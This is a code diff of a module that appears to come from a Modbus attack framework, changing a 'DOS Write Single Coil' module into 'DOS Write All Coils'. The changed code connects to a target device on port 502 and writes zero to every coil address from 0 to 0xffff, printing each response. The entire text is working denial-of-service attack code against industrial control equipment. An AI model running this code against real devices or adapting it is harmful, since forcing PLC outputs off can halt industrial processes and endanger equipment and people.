@@ -12,16 +12,16 @@ class Module:
 
 
 	info = {
-		'Name': 'DOS Write Single Coil',
+		'Name': 'DOS Write All Coils',
 		'Author': ['@enddo'],
-		'Description': ("DOS With Write Single Coil Function"),
+		'Description': ("DOS With Write All Coils"),
 
         }
 	options = {
 		'RHOST'		:[''		,True	,'The target IP address'],
 		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
-		'UID'		:[''		,True	,'Modbus Slave UID.'],
-		'Threads'	:[24		,False	,'The number of concurrent threads'],
+		'UID'		  :[''		,True	,'Modbus Slave UID.'],
+		'Threads'	:[1		,False	,'The number of concurrent threads'],
 		'Output'	:[False		,False	,'The stdout save in output directory']
 	}	
 	output = ''
@@ -61,13 +61,17 @@ class Module:
 		global down
 		if(down == True):
 			return None
-		while True:
+		for i in range(0xffff):
 			c = connectToTarget(ip,self.options['RPORT'][0])
 			if(c == None):
 				down = True
 				return None
 			try:
-				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU05_Write_Single_Coil(outputAddr=int(hex(random.randint(0,16**4-1)|0x1111),16),outputValue=int('0x0000',16)),timeout=timeout, verbose=0)
+				self.printLine('[+] Write on Address ' + str(int(hex(i|0x1111),16)),bcolors.OKGREEN)
+				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU05_Write_Single_Coil(outputAddr=int(hex(i|0x1111),16),outputValue=int('0x0000',16)),timeout=timeout, verbose=0)
+				ans = ModbusADU_Answer(str(ans))
+				self.printLine('[+] Response is :',bcolors.OKGREEN)
+				ans.show()
 			except:
 				pass
 			
